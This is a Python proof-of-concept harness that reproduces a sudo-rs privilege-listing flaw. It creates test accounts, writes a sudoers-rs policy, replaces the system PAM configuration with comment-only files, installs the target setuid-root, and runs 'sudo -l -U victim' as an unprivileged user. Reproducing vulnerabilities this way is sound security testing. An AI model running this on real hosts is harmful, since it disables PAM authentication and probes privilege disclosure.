#!/usr/bin/env python3
"""Deterministic multi-user trigger for the sudo-rs listing scenario."""

import argparse
import json
import os
import pwd
import shutil
import signal
import subprocess
import sys
import time

CONFIG_PATH = "/etc/sudoers-rs"
PAM_SUDO_PATH = "/etc/pam.d/sudo"
PAM_OTHER_PATH = "/etc/pam.d/other"
PAM_CONF_PATH = "/etc/pam.conf"
INSTALL_DIR = "/usr/local/bin"
INSTALL_NAME = "sudo-rs-poc"
INSTALL_PATH = os.path.join(INSTALL_DIR, INSTALL_NAME)
INVOKER = "invoker"
VICTIM = "victim"
CONFIG_CONTENT = (
    "invoker ALL=(ALL:ALL) NOPASSWD: /bin/true\n"
    "victim ALL=(ALL:ALL) ALL\n"
)
PAM_COMMENT = "# PAM services disabled for the sudo-rs PoC; no modules are loaded.\n"


def _decode(data: bytes) -> str:
    return data.decode("utf-8", errors="replace")


def _ensure_user(name: str) -> tuple:
    """Create the named unprivileged account if it does not already exist.

    Returns the account's ``(uid, primary_gid)`` pair.
    """
    try:
        pw = pwd.getpwnam(name)
        return pw.pw_uid, pw.pw_gid
    except KeyError:
        pass

    candidates = [shutil.which("useradd"), "/usr/sbin/useradd"]
    useradd = next((c for c in candidates if c), None)
    if useradd is None:
        raise RuntimeError("useradd is not available")

    proc = subprocess.run(
        [useradd, "-m", name],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.DEVNULL,
        text=True,
    )
    if proc.returncode != 0:
        # Race with another creator, or another account provider already made it.
        try:
            pw = pwd.getpwnam(name)
            return pw.pw_uid, pw.pw_gid
        except KeyError:
            raise RuntimeError(
                "failed to create user %s: %s" % (name, proc.stderr.strip() or proc.stdout.strip())
            )
    pw = pwd.getpwnam(name)
    return pw.pw_uid, pw.pw_gid


def _write_root_file(path: str, content: str, mode: int) -> None:
    """Write a file as root with a fixed mode, replacing any existing file."""
    parent = os.path.dirname(path)
    if parent:
        os.makedirs(parent, mode=0o755, exist_ok=True)

    flags = os.O_WRONLY | os.O_CREAT | os.O_TRUNC
    fd = os.open(path, flags, 0o644)
    try:
        os.write(fd, content.encode("utf-8"))
        os.fchown(fd, 0, 0)
        os.fchmod(fd, mode)
    finally:
        os.close(fd)


def _install_setuid_binary(src: str) -> str:
    """Copy the target to a root-owned private path and mark it setuid-root."""
    src = os.path.abspath(src)
    if not os.path.isfile(src):
        raise RuntimeError("target binary does not exist or is not a file: %s" % src)

    os.makedirs(INSTALL_DIR, mode=0o755, exist_ok=True)

    # Replace any previous installation, but never copy a file onto itself.
    same_file = False
    if os.path.islink(INSTALL_PATH):
        os.unlink(INSTALL_PATH)
    elif os.path.lexists(INSTALL_PATH):
        try:
            same_file = os.path.samefile(src, INSTALL_PATH)
        except OSError:
            same_file = False
        if not same_file:
            os.unlink(INSTALL_PATH)

    if not same_file:
        shutil.copyfile(src, INSTALL_PATH)

    os.chown(INSTALL_PATH, 0, 0)
    os.chmod(INSTALL_PATH, 0o4755)

    st = os.stat(INSTALL_PATH)
    if not (st.st_uid == 0 and (st.st_mode & 0o7777) == 0o4755):
        raise RuntimeError("installed binary does not have root ownership and setuid mode: %s" % INSTALL_PATH)
    return INSTALL_PATH


def _clean_env() -> dict:
    return {
        "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "LANG": "C",
        "LC_ALL": "C",
    }


def _run_invocation(tool: str, timeout_seconds, invoker_uid, invoker_gid) -> dict:
    command = [tool, "-l", "-U", VICTIM]
    started = time.monotonic()
    try:
        proc = subprocess.run(
            command,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            user=invoker_uid,
            group=invoker_gid,
            extra_groups=[],
            env=_clean_env(),
            timeout=timeout_seconds,
        )
        elapsed_ms = int((time.monotonic() - started) * 1000)
        stdout = _decode(proc.stdout)
        stderr = _decode(proc.stderr)
        if proc.returncode < 0:
            signame = signal.Signals(-proc.returncode).name
            return {
                "command": command,
                "returncode": None,
                "signal": signame,
                "timed_out": False,
                "runtime_ms": elapsed_ms,
                "stdout": stdout,
                "stderr": stderr,
            }
        return {
            "command": command,
            "returncode": proc.returncode,
            "signal": None,
            "timed_out": False,
            "runtime_ms": elapsed_ms,
            "stdout": stdout,
            "stderr": stderr,
        }
    except subprocess.TimeoutExpired as exc:
        elapsed_ms = int((time.monotonic() - started) * 1000)
        stdout = _decode(exc.stdout or b"")
        stderr = _decode(exc.stderr or b"")
        return {
            "command": command,
            "returncode": None,
            "signal": signal.Signals.SIGKILL.name,
            "timed_out": True,
            "runtime_ms": elapsed_ms,
            "stdout": stdout,
            "stderr": stderr,
        }
    except OSError as exc:
        elapsed_ms = int((time.monotonic() - started) * 1000)
        return {
            "command": command,
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": elapsed_ms,
            "stdout": "",
            "stderr": "",
            "_error": "failed to execute invocation: %s" % exc,
        }


def build_scenario(binary: str, timeout_seconds) -> dict:
    """Build the scenario and invoke the target once as an unprivileged user."""
    if os.geteuid() != 0:
        raise RuntimeError("this script must run as root")

    invoker_uid, invoker_gid = _ensure_user(INVOKER)
    _ensure_user(VICTIM)

    # Root-owned sudoers-rs policy that only the privileged tool may read.
    _write_root_file(CONFIG_PATH, CONFIG_CONTENT, 0o440)

    # A comment-only PAM service means pam_start/pam_authenticate can succeed
    # without loading any shared PAM module. Neutralize both fallback sources.
    _write_root_file(PAM_SUDO_PATH, PAM_COMMENT, 0o644)
    _write_root_file(PAM_OTHER_PATH, PAM_COMMENT, 0o644)
    _write_root_file(PAM_CONF_PATH, PAM_COMMENT, 0o644)

    tool = _install_setuid_binary(binary)

    invocation = _run_invocation(tool, timeout_seconds, invoker_uid, invoker_gid)
    invocation["binary"] = binary
    invocation["error"] = invocation.pop("_error", None)
    invocation["observable"] = {
        "kind": "list",
        "value": invocation["stdout"] + invocation["stderr"],
        "path": CONFIG_PATH,
    }
    return invocation


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description="Run the sudo-rs privilege-listing PoC.")
    parser.add_argument("--binary", required=True, help="path to the target binary")
    parser.add_argument("--json-out", help="optional path to mirror the JSON result")
    parser.add_argument("--timeout", type=float, default=None, help="per-invocation timeout in seconds")
    args = parser.parse_args(argv)

    timeout_seconds = args.timeout if args.timeout is not None and args.timeout > 0 else 30.0
    try:
        result = build_scenario(args.binary, timeout_seconds)
    except Exception as exc:  # noqa: BLE001 - the harness requires a JSON result on failure
        result = {
            "binary": args.binary,
            "command": [],
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": "",
            "observable": {
                "kind": "list",
                "value": "",
                "path": CONFIG_PATH,
            },
            "error": str(exc),
        }

    text = json.dumps(result, sort_keys=True) + "\n"
    sys.stdout.write(text)
    sys.stdout.flush()

    if args.json_out:
        try:
            with open(args.json_out, "w", encoding="utf-8") as fh:
                fh.write(text)
        except OSError as exc:
            # Do not alter the already-emitted stdout object.
            pass
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
